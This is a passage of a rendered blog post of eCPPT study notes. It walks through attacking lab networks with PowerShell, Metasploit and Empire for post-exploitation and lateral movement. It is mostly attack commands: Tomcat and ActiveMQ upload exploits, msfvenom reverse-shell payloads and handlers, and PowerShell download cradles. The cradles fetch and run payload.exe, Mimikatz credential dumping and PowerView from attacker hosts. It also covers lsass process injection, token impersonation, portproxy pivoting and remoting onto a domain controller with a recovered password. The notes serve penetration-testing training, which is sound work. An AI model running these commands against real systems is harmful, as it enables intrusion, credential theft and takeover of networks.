+</span><span class="n">set</span><span class="w"> </span><span class="nx">LOCAL_ADDRESS</span><span class="w"> </span><span class="nx">10.100.11.101</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">first</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">compromise.</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">LOCAL_PORT</span><span class="w"> </span><span class="nx">4444</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="nx">1</span><span class="w">
+</span><span class="n">run</span><span class="w">
+
+</span><span class="n">use</span><span class="w"> </span><span class="nx">exploit/multi/http/tomcat_jsp_upload_bypass</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">options</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">payload</span><span class="w"> </span><span class="nx">java/jsp_shell_reverse_tcp</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">rport</span><span class="w"> </span><span class="nx">8443</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">access</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">apache</span><span class="w"> </span><span class="nx">page</span><span class="w">
+</span><span class="n">run</span><span class="w">
+</span><span class="nx">//</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">should</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">back</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="upgrade-the-shell-to-a-meterpreter-shell">upgrade the shell to a meterpreter shell</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.100.11.101 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> exe <span class="o">&gt;</span> /tmp/payload.exe
+
+python3 <span class="nt">-m</span> http.server 8000
+</code></pre></div></div>
+
+<h3 id="lets-add-another-port-in-the-portproxy">lets add another port in the portproxy</h3>
+<p>use post/windows/manage/portproxy</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">set</span><span class="w"> </span><span class="nx">CONNECT_ADDRESS</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">CONNECT_PORT</span><span class="w"> </span><span class="nx">8000</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">LOCAL_ADDRESS</span><span class="w"> </span><span class="nx">10.100.11.101</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">first</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">compromise.</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">LOCAL_PORT</span><span class="w"> </span><span class="nx">8000</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">session</span><span class="w"> </span><span class="nx">1</span><span class="w">
+</span><span class="n">run</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>[!NOTE] cool</p>
+</blockquote>
+
+<h3 id="set-a-handler">set a handler</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">jobs</span><span class="w"> </span><span class="nt">-K</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="nx">kill</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">jobs</span><span class="w"> </span><span class="nx">opens</span><span class="w">
+</span><span class="n">use</span><span class="w"> </span><span class="nx">exploit/multi/handler</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">options</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">lport</span><span class="w"> </span><span class="nx">4444</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">opened</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">portproxy</span><span class="w">
+</span><span class="n">exploit</span><span class="w"> </span><span class="nt">-j</span><span class="w">
+</span></code></pre></div></div>
+
+<p>in the Java shell:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'http://10.100.11.101:8000/payload.exe'</span><span class="p">,</span><span class="w"> </span><span class="s1">'C:\Windows\Temp\payload.exe'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<p>// then execute it
+	C:\windows\temp\payload.exe</p>
+
+<blockquote>
+  <p>we should gain a shell back from meterpreter from our handler</p>
+</blockquote>
+
+<h3 id="obtain-hashes-using-mimikatz">Obtain Hashes using Mimikatz</h3>
+
+<p>in Java session:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">	</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://10.100.11.101:8000/Invoke-Mimikatz.ps1'</span><span class="p">);</span><span class="w"> </span><span class="nx">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-DumpCreds</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>of course, make sure the <strong>Invoke-Mimikatz</strong> is in the python web host directory.
+this cradle will download and execute the Invoke-Mimikatz
+we should get hashes back</p>
+</blockquote>
+
+<h3 id="extra---psinject">Extra [+]  PSINJECT</h3>
+
+<p>// PSINJECT is the same as migrate from metasploit but its from Empire</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">interact</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">agent</span><span class="w"> </span><span class="nx">number</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">shell</span><span class="w"> </span><span class="nx">ps</span><span class="w">
+
+</span><span class="n">searchmodule</span><span class="w"> </span><span class="nx">psinject</span><span class="w">
+</span><span class="n">usemodule</span><span class="w"> </span><span class="nx">management/psinject</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">Agent</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">agent</span><span class="w"> </span><span class="nx">number</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">Listener</span><span class="w"> </span><span class="nx">http</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">ProcId</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">the</span><span class="w"> </span><span class="nx">PID</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">you</span><span class="w"> </span><span class="nx">wanna</span><span class="w"> </span><span class="nx">migrate</span><span class="p">,</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">case</span><span class="w"> </span><span class="nx">lsass</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">execute</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>this should open a new agent (session)
+just type agents to visualize</p>
+</blockquote>
+
+<h2 id="lab-2-powershell-for-post-exploitation-and-lateral-movement">Lab 2 Powershell for post-exploitation and Lateral Movement</h2>
+
+<p>targets network: 172.17.80.0/24</p>
+
+<p>myip: 175.13.80.5</p>
+
+<h3 id="gather-information">gather information</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sn</span> <span class="nt">-oG</span> - 172.17.80.<span class="k">*</span> | <span class="nb">awk</span> <span class="s1">'/Up$/ {print $2}'</span>
+fping <span class="nt">-a</span> <span class="nt">-g</span> 172.17.80.0/24 2&gt;/dev/null <span class="o">&gt;</span> hostsup
+
+- 172.17.80.1
+- 172.17.80.100
+</code></pre></div></div>
+
+<h3 id="exploit-apache-activemq">Exploit Apache ActiveMQ</h3>
+<p>// we found that port 8161 is running Apache ActiveMQ, so I searched For that version in metasploit 
+	exploit(multi/http/apache_activemq_upload_jsp)
+and got a shell.</p>
+
+<p>// ip discovered: 10.100.11.101</p>
+
+<p>in Meterpreter session:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">run</span><span class="w"> </span><span class="nx">autoroute</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">10.100.11.0/24</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="token-impersonation">Token Impersonation</h3>
+<p>use incognito
+list_tokens -u
+impersonate_token ELS-CHILD\local_admin</p>
+
+<h3 id="sending-powerview-to-the-target">Sending PowerView to the target</h3>
+<p>open a web host with python
+then send and execute the file:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="s2">"IEX (New-Object Net.WebClient).DownloadString('http://175.13.80.5:8000/PowerView.ps1'); Get-NetDomainController"</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="results">Results</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Forest                     : eLS.local
+CurrentTime                : 1/8/2022 11:36:28 PM
+HighestCommittedUsn        : 209035
+OSVersion                  : Windows Server 2012 R2 Standard
+Roles                      : {PdcRole, RidRole, InfrastructureRole}
+Domain                     : els-child.eLS.local
+IPAddress                  : 10.100.10.253
+SiteName                   : Default-First-Site-Name
+SyncFromAllServersCallback : 
+InboundConnections         : {18be55e6-23fd-4162-ab64-6b2cf34040e5}
+OutboundConnections        : {e308ece2-539f-4f7a-9fc2-fee4e5adfd31}
+Name                       : child-dc01.els-child.eLS.local
+Partitions                 : {CN=Configuration,DC=eLS,DC=local, CN=Schema,CN=Co
+                             nfiguration,DC=eLS,DC=local, DC=ForestDnsZones,DC=
+                             eLS,DC=local, DC=els-child,DC=eLS,DC=local...}
+
+</code></pre></div></div>
+
+<blockquote>
+  <p>[+]
+// DC
+els.child.eLS.local
+10.100.10.253</p>
+</blockquote>
+
+<h3 id="local_admin-is-a-local-administrator-of-the-domain-controller">local_admin is a local administrator of the domain controller</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="s2">"IEX (New-Object Net.WebClient).DownloadString('http://175.13.80.5:8000/PowerView.ps1'); Find-LocalAdminAccess"</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="going-back-to-system">going back to SYSTEM</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctrl+z the shell
+<span class="k">in </span>Meterpreter:
+	rev2self
+</code></pre></div></div>
+
+<h3 id="search-for-files">search for files</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">search</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w">
+
+</span><span class="n">found</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">uat_teste_account.txt</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">credentials:</span><span class="w">
+	</span><span class="n">Username:</span><span class="w"> </span><span class="nx">ELS-CHILD\local_admin</span><span class="w">
+	</span><span class="n">Password:</span><span class="w"> </span><span class="nx">P</span><span class="err">@</span><span class="nx">ssw0rd123</span><span class="w"> 
+</span></code></pre></div></div>
+
+<h3 id="arp-scanner">arp scanner</h3>
+<p>use post/windows/gather/arp_scanner
+set options
+// we found a new ip 10.11.100.101</p>
+
+<h3 id="set-a-proxy-to-the-internal-network">set a proxy to the internal network</h3>
+<p>use post/windows/manage/portproxy</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">set</span><span class="w"> </span><span class="nx">CONNECT_ADDRESS</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">CONNECT_PORT</span><span class="w"> </span><span class="nx">4444</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">LOCAL_ADDRESS</span><span class="w"> </span><span class="nx">10.100.11.101</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">LOCAL_PORT</span><span class="w"> </span><span class="nx">4444</span><span class="w"> 
+</span><span class="n">set</span><span class="w"> </span><span class="nx">SESSION</span><span class="w"> </span><span class="nx">1</span><span class="w">
+</span><span class="n">run</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="powershell_remoting-to-execute-commands-in-that-internal-network">powershell_remoting to execute commands in that internal network</h3>
+<p>use exploit/windows/local/powershell_remoting</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">set</span><span class="w"> </span><span class="nx">SMBUSER</span><span class="w"> </span><span class="nx">local_admin</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">SMBPASS</span><span class="w"> </span><span class="nx">P</span><span class="err">@</span><span class="nx">ssw0rd123</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">SMBDOMAIN</span><span class="w"> </span><span class="nx">ELS-CHILD</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">RHOSTS</span><span class="w"> </span><span class="nx">10.100.11.100</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">payload</span><span class="w"> </span><span class="nx">windows/x64/meterpreter/reverse_tcp</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">LHOST</span><span class="w"> </span><span class="nx">10.100.11.101</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">LPORT</span><span class="w"> </span><span class="nx">4444</span><span class="w">
+</span><span class="n">exploit</span><span class="w"> </span><span class="nt">-j</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>we should get a shell back from the win10 machine</p>
+</blockquote>
+
+<h3 id="to-execute-commands-on-the-dc-we-just-need-to-modify-the-powershell_remoting">to execute commands on the DC, we just need to modify the powershell_remoting</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">set</span><span class="w"> </span><span class="nx">SESSION</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nx">win10</span><span class="w"> </span><span class="nx">machine</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">RHOSTS</span><span class="w"> </span><span class="nx">10.100.10.253</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">DC</span><span class="w">
+</span><span class="n">exploit</span><span class="w"> </span><span class="nt">-j</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>now we should have a shell from the DC</p>
+</blockquote>
+
+<h3 id="download-cradles-used">download cradles used</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="s2">"iex (New-Object Net.WebClient).DownloadFile('http://10.100.11.101:8000/payload.exe', 'C:\Windows\Temp\payload.exe')"</span><span class="w">
+
+</span><span class="n">powershell</span><span class="w"> </span><span class="s2">"IEX (New-Object Net.WebClient).DownloadString('http://175.13.80.5:8000/shell.exe')
+</span></code></pre></div></div>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#begginer" class="page__taxonomy-item" rel="tag">begginer</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#powershell" class="page__taxonomy-item" rel="tag">powershell</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ecppt" class="page__taxonomy-item" rel="tag">ecppt</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-11-21T00:00:00+06:00">November 21, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=3+-+Powershell%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fecppt%2Fpowershell%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fecppt%2Fpowershell%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fecppt%2Fpowershell%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/notes/ecppt/networksecurity/" class="pagination--pager" title="2 - Network Security
+">Previous</a>
+    
+    
+      <a href="/notes/ecppt/linux/" class="pagination--pager" title="4 - Linux Security
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
